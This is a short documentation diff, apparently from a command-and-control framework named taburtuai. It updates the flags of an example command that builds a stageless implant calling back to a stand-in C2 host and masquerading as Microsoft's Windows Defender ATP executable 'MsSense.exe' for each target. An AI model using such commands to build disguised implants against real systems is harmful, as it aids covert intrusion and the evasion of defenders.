@@ -23,12 +23,11 @@ Every build should use a different per-binary config:
 ```bash
 # Different output name, realistic masquerade for each target
 ./bin/taburtuai-generate stageless \
-  --server https://c2.example.com \
+  --c2 https://c2.example.com \
   --key changeme \
   --masq-company "Microsoft Corporation" \
   --masq-desc "Windows Defender Advanced Threat Protection" \
-  --masq-origfile "MsSense.exe" \
-  --strip \
+  --masq-orig "MsSense.exe" \
   --no-gui \
   --output ./builds/target_corp_$(date +%Y%m%d).exe
 ```
